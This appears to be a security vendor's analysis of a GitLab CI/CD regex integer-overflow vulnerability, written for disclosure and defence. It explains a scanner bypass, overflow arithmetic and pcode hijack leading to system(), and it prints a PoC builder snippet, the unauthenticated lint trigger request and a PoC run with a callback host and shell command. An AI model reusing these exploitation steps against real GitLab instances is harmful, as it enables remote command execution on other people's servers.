title: Rapid7 Analysis: GitLab CI/CD Regex Integer Overflow (CVE-2026-97229)
summary: Rapid7 analyzes CVE-2026-97229, showing how GitLab CI regex compilation turns an Onigmo integer overflow into native code execution, with a public PoC.
body_markdown:
## Overview


On October 12, 2026, GitLab released


19.4.2


,


19.3.5


, and


19.2.8


to fix


[CVE-2026-97229](https://nvd.nist.gov/vuln/detail/CVE-2026-97229) , an integer overflow in its CI/CD regular-expression handling. The issue was reported through HackerOne by


[joaxcar](https://x.com/joaxcar) . GitLab assigned it a CVSS score of 10.0 and described possible code execution by an unauthenticated user.


The


[advisory](https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-4-2-released/#cve-2026-97229---integer-overflow-issue-in-cicd-regular-expression-compiler-impacts-gitlab-ceee) states that CVE-2026-97229 affects GitLab CE and EE from


19.2


before


19.2.8


,


19.3


before


19.3.5


, and


19.4


before


19.4.2


. GitLab says all deployment types are affected unless stated otherwise. GitLab.com was patched before disclosure, and Dedicated customers do not need to act.


Rapid7 researchers developed an


[end-to-end PoC](https://github.com/jburgess-r7/CVE-2026-97229-PoC) that reliably runs arbitrary commands as GitLab's


git


operating-system account on the official Linux amd64


gitlab/gitlab-ce:19.4.1-ce.0


image with ASLR enabled. GitLab's release notes do not report exploitation in the wild occurring at the time of disclosure.


This analysis covers one end-to-end route. It begins after an attacker has pushed both the malicious CI configuration and a specially named path to a public project; only the final CI lint request is unauthenticated. That prerequisite conflicts with GitLab's


PR:N


rating, and because the underlying report remains private, we do not yet know how the reported attack avoids it.


## Technical analysis


At a high level, the chain crosses from attacker-controlled repository input into Onigmo pcode and finally native code execution.


*Figure 1: From repository inputs to command execution.*


### CI rules pass repository paths to Onigmo


GitLab supports regular-expression matching over repository paths in


rules:exists:regexp


and


rules:changes:regexp


. One way to evaluate such an expression during static configuration processing is to place it on a conditional include:


```text
include:
- local: /benign.yml
rules:
- exists:
regexp: "ATTACKER_PATTERN"
```


RegexpMatcher


expands the expression, compiles it with Ruby's native regular-expression engine, and tests it against paths from the selected Git worktree:


```text
# Exists#regexp_match?()
def regexp_match?(context)
matcher = regexp_matcher(context)  matcher.validate_pattern_length! # [0] Source-length check


Gitlab::SafeRequestStore.fetch(regexp_comparison_key(context, matcher.expanded_pattern)) do
# ... top-level optimisation omitted
matcher.match?(worktree_paths(context, false)) # [1] Repository paths
end
end


# RegexpMatcher#match?()
def match?(paths)
# ... path-count fail-open handling omitted
pattern = compile_pattern # [2] Compile regexp
deadline = current_monotonic_time + REGEXP_TOTAL_TIMEOUT_SECONDS


paths.any? do |path|
# ... total-budget check omitted
pattern.match?(path) # [3] Native match
# ... per-match timeout handling omitted
end
end
```


By the time execution reaches


\[0\]


, GitLab is checking only the length of the expanded source expression. The call at


\[1\]


supplies every filename in the selected commit, while


compile_pattern


at


\[2\]


ultimately invokes


Regexp.new


. Each iteration at


\[3\]


therefore crosses from CI configuration into native


[Onigmo](https://github.com/k-takata/onigmo) with a repository path as the match subject.


### Smuggling a large repeat through the checks


GitLab places several sensible limits around CI regular expressions. The interesting parts of its wrapper are shown below:


```text
REPEAT_BOUND = /(?<!\\)(?:\\\\)*\{\s*(\d+)\s*(?:,\s*(\d+)?\s*)?\}/ # [4] Repeat scanner


def self.compile_regexp(pattern, timeout: nil)
raise RegexpError, 'uses a subroutine call (\g), which is not allowed' if SUBROUTINE_CALL.match?(pattern) # [5] Subroutine-call check
reject_large_repeats!(pattern) # [6] Repeat-bound check


alternation_free = pattern.gsub(ESCAPE_OR_ALTERNATION) { |token| token == '|' ? '\\|' : token }


probe =
begin
Regexp.new(alternation_free)
rescue RegexpError => e
# ... error-message rewriting omitted
end


check_compiled_size!(probe) # [7] Probe size check
check_compiled_size!(Regexp.new(pattern, timeout: timeout)) # [8] Final size check
end
```


The source-length check occurs before this function. The subroutine-call check at


\[5\]


and the repeat-bound check at


\[6\]


defend against structural growth, but the scanner at


\[4\]


recognizes only contiguous digits. Compilation then happens twice:


\[7\]


checks an alternation-free probe, and


\[8\]


checks the requested expression and attaches the 50-millisecond timeout. Either object is rejected if it exceeds one megabyte.


The PoC hides its quantifier bound from the scanner at


\[4\]


via an inline comment:


{5(?#)7805}


(?#)


is an inline regex comment. Onigmo ignores it and reads the bound as 57,805. GitLab's scanner expects contiguous digits, so it does not see a bound above 1,000.


That bypass admits the large repeat, but the checked expression is still only 986 bytes. The six


\[\[:word:\]\]


classes expand when matching begins against a repository path containing valid four-byte UTF-8 characters. Ruby recompiles the same source for UTF-8, each POSIX word class expands into a large Unicode range table, and GitLab never checks the size of this new program.


Ruby selects or recompiles the regex before starting its timed matcher:


```text
/* re.c: rb_reg_prepare_re() */
regex_t *reg = RREGEXP_PTR(re);
if (reg->enc == enc) return reg; // [9] Matching encoding


// ... source preprocessing and use-count branch omitted
r = onig_new_without_alloc(&tmp_reg, (UChar *)ptr, (UChar *)(ptr + len),
reg->options, enc,
OnigDefaultSyntax, &einfo); // [10] Onigmo recompile
// ... error handling and old-program replacement omitted


/* re.c: rb_reg_onig_match() */
reg = rb_reg_prepare_re(re, str);
// ... use-count bookkeeping omitted
OnigPosition result = match(reg, str, regs, args); // [11] Begin timed match
// ... result cleanup omitted
```


At


\[9\]


, Ruby returns the existing program only when its encoding matches the subject. Otherwise,


\[10\]


recompiles the source for the subject encoding via Onigmo. Only then does


\[11\]


begin timed matching, leaving the unsafe compilation outside the timeout.


Onigmo compiles the regular expression into bytecode, which its source calls pcode. Its regex VM then runs that pcode against each path, so the UTF-8 recompilation at


\[10\]


is where the oversized pcode program is created.


The repeated target also carries the bytes that run after the overflow:


```text
# poc.py: build()
# ... prefix setup omitted
target = "(?<=" + "[[:word:]]" * 6 + "".join(character_class(stage) for stage in STAGES)
digits = str(REPEAT_COUNT)
pattern = f"\\A(?>{prefix}(?:{target}){{{digits[0]}(?#){digits[1:]}}}|)\\b\\B"
```


The six


\[\[:word:\]\]


classes are only the size multiplier. The payload sits in four more character classes generated by


character_class(stage)


. A class such as


\[abc\]


compiles to a bitmap with bits set for


a


,


b


, and


c


. The helper works backwards from each desired pcode sequence and chooses class members whose bitmap reproduces those bytes. This puts attacker-controlled VM instructions at the end of every expanded copy.


### Crossing


INT_MAX


Under UTF-8, one copy of the repeated body is 37,151 bytes. The relevant


[Onigmo compiler code in Ruby 3.3.12](https://github.com/ruby/ruby/blob/v3_3_12/regcomp.c#L1154-L1170) is:


```text
/* regcomp.c: compile_quantifier_node() */
/* ... earlier quantifier cases omitted */
else if (!infinite && qn->greedy &&
(qn->upper == 1 || (tlen + SIZE_OP_PUSH) * qn->upper
<= QUANTIFIER_EXPAND_LIMIT_SIZE)) { // [12] Signed size check
int n = qn->upper - qn->lower;


r = compile_tree_n_times(qn->target, qn->lower, reg); // [13] Expand lower copies
if (r) return r;


// ... optional copies omitted
}
/* ... remaining quantifier cases omitted */
```


With this body size (37,151) and quantifier bound (57,805):


37,151 × 57,805 = 2,147,513,555 = 0x800074d3


That is 29,908 (0x74D4) bytes beyond signed


INT_MAX


(0x7FFFFFFF). At


\[12\]


, the negative result satisfies the compiler's “small enough to expand” test. Onigmo enters the expansion path at


\[13\]


and emits all 57,805 copies.


The


|


immediately after


{5(?#)7805}


makes the repeated body the first alternative and leaves the second alternative empty. Onigmo compiles this


|


into two pcode branches. An


OP_PUSH


near the beginning is meant to record the empty alternative as a backtracking target, but does not transfer execution on this path. The first bad transfer is the


OP_JUMP


emitted after the giant first alternative by the


[alternation compiler](https://github.com/ruby/ruby/blob/v3_3_12/regcomp.c#L1730-L1754) :


```text
/* regcomp.c: compile_tree(), NT_ALT */
/* ... calculate alternation length omitted */
pos = reg->used + len;  /* goal position */


/* ... emit the fallback and first alternative omitted */
if (IS_NOT_NULL(NCDR(node))) {
len = pos - (reg->used + SIZE_OP_JUMP);
r = add_opcode_rel_addr(reg, OP_JUMP, len); // [14] Skip empty branch
if (r) break;
}
```


The jump at


\[14\]


should skip the empty alternative and land at the end of the alternation. The compiler calculated


pos


from the already wrapped length, however. Our build emits the jump at offset 2,147,513,698 with a displacement of


-136


, sending execution into the first payload bitmap in the last expanded copy, 140 bytes from the end of the pcode.


### From character-class bitmap to


system()


The wrapped branch now leaves normal generated pcode and enters a controlled character-class bitmap. Onigmo consequently runs the bytes encoded by


character_class()


as VM instructions, starting the sequence shown here.


*Figure 2: From controlled Onigmo pcode to native command execution.*


The controlled pcode redirects Onigmo's backtracking stack, which holds saved match state, into the repository path. On a failed match, the VM restores the two values shown in the diagram: the next instruction from the path and


FinishCode


, a pointer from its bottom stack frame. The first value decides where controlled pcode resumes. The second gives it a known address inside


libruby


.


The path instruction sends control to the final controlled bitmap. That bitmap adjusts the recovered


libruby


pointer to a short instruction sequence that passes the path command to


system()


, then writes that address into


match_at()


's native return slot. When the matcher finishes, execution returns through the overwritten slot.


FinishCode


and the call site are in the same


libruby


mapping, so the distance between them stays constant under ASLR.


## Exploitation


### Delivering the branch through CI lint


Once the malicious configuration and path are present on a public branch, GitLab's CI lint API supplies an unauthenticated trigger. The


GET


form accepts an attacker-selected


content_ref


, loads


.gitlab-ci.yml


from that commit, and evaluates it:


```text
GET /api/v4/projects/attacker%2Fpublic-project/ci/lint?content_ref=payload-ref
Host: gitlab.example
```


The route checks whether the requester may read the public repository, resolves the supplied ref, and passes its CI configuration to the static linter:


```text
get ':id/ci/lint' do
authorize_read_code! # [17] Read authorization
not_found! 'Repository' if user_project.empty_repo?


unauthorized!("This endpoint requires an API authentication") if current_user && !::Current.token_info # [18] Token check


content_ref = params[:content_ref] || params[:sha] || user_project.repository.root_ref_sha # [19] Select commit
dry_run_ref = params[:dry_run_ref] || params[:ref] || user_project.default_branch


commit = user_project.commit(content_ref)
not_found! 'Commit' unless commit.present?


content = user_project.repository.blob_data_at(commit.sha, user_project.ci_config_path_or_default)
result = Gitlab::Ci::Lint
.new(project: user_project, current_user: current_user, sha: commit.sha)
.legacy_validate(content, dry_run: params[:dry_run], ref: dry_run_ref) # [20] Run static lint


present result, with: Entities::Ci::Lint::Result, current_user: current_user, include_jobs: params[:include_jobs]
end
```


Public visibility makes


authorize_read_code!


at


\[17\]


succeed without credentials, while the condition at


\[18\]


does not reject an absent


current_user


. The selected branch becomes the static linter's input through


\[19\]


and


\[20\]


, without creating a pipeline or contacting a runner. This is why the exploit's trigger can be unauthenticated even though the demonstrated setup requires project write access.


### Running a command


The


[initial Python PoC](https://github.com/jburgess-r7/CVE-2026-97229-PoC) clones a public project controlled by the operator, creates a payload branch, starts the callback, and sends the lint request:


```text
$ python3 poc.py https://g.example 123 \
--git-url 'https://oauth2: [email protected]  /attacker/public-poc.git' \
--callback-url cb.ex:8000 \
--cmd 'uname -a && id'
[*] deployed attacker ref 69fe2478c446ab17afe4c150; executing: uname -a && id
[*] delivery GET https://g.example/api/v4/projects/123/ci/lint?content_ref=69fe2478c446ab17afe4c150
[*] target stopped responding after delivery: HTTP Error 502: Bad Gateway
[uname output omitted]
uid=998(git) gid=998(git) groups=998(git)
```


HTTP 502 is expected. The command runs synchronously in a Puma worker. After


system()


returns, the corrupted worker crashes. GitLab Workhorse, the reverse proxy in front of Puma, sees its Rails backend connection close and returns 502. Puma replaces the worker. The callback output, not the HTTP status, is the success signal.


The target-specific values in this PoC, such as


SYSTEM_STEP_COUNT


, the number of UTF-8 backward steps from


FinishCode


to the


libruby


system()


call site, match official GitLab CE


19.4.1


on Linux amd64. Other vulnerable packages or architectures need adjusted pcode and


libruby


offsets. A little over 2 GiB is required in the worker, and our complete single-node GitLab target needed about 9 GiB available. Low-memory instances may swap, reject the allocation, or invoke the OOM killer.


## The fix


GitLab's


[Ruby backport](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/9845) replaces the multiplication at


\[12\]


with a division-based test, which cannot overflow, and rejects compiled programs above roughly 512 MiB:


```text
/* regcomp.c */
#define IS_EXPAND_LIMIT_OK(tlen, n) \
((n) <= 0 || (tlen) <= QUANTIFIER_EXPAND_LIMIT_SIZE / (n))


/* ... unrelated compiler declarations omitted */
#define MAX_COMPILED_PROGRAM_SIZE (INT_MAX_LIMIT / 4)
```


On the patched image, the crafted quantifier remains a compact loop and the request returns a normal false match. The repeat-range double-free fixed in the same release affects an error path and is not part of this chain.


## Detection guidance


For the exploitation strategy described in this analysis, correlate:


1.


/var/log/gitlab/gitlab-workhorse/current


: a several-second


GET /api/v4/projects/<project>/ci/lint?content_ref=<ref>


,


badgateway: failed to receive response: EOF


, and HTTP 502.


2.


A Puma worker crashes or restarts at the same time; any saved trace contains


regexp_matcher.rb


.


3.


The referenced commit: an


(?#)


-split repeat, repeated POSIX word classes, and a path containing four-byte UTF-8 characters.


A shell child or roughly 2 GiB worker-memory increase strengthens the match. The undisclosed path may differ.


## Mitigation guidance


Self-managed GitLab customers should upgrade to the fixed patch for their release:


19.2.8


,


19.3.5


, or


19.4.2


. As a temporary measure, restrict credential-free access to attacker-writable public projects or block this lint route. Route controls do not repair the vulnerable Ruby compiler.


Please read GitLab's


[critical patch release](https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-4-2-released/) for the latest guidance.
